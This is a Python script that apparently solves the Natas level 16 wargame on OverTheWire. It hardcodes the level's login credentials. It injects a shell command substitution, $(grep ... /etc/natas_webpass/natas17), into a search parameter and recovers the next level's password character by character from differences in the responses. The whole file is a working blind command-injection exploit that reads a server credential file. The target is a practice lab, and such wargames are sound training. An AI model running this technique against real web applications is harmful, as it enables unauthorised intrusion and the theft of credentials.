#!/usr/bin/env python3

#=== Modules ===
import requests
import string
import sys
from requests.auth import HTTPBasicAuth

# === Authentication and characters for payload ===
auth = HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
characters = string.ascii_letters + string.digits
needle = ""

# === Driver loop ===
while True:
    for c in characters:
        url = f"http://natas16.natas.labs.overthewire.org/index.php?needle=$(grep -E ^{needle + c}.* /etc/natas_webpass/natas17)hacker"
        print(f"Trying... {url}")
        r = requests.get(url,auth=auth)

        # == Analyze request === 
        if ('hacker' not in r.text):
            needle += c 
            break
        elif (c == '9'):
            print(f"natas17 Password: {needle}")
            sys.exit()


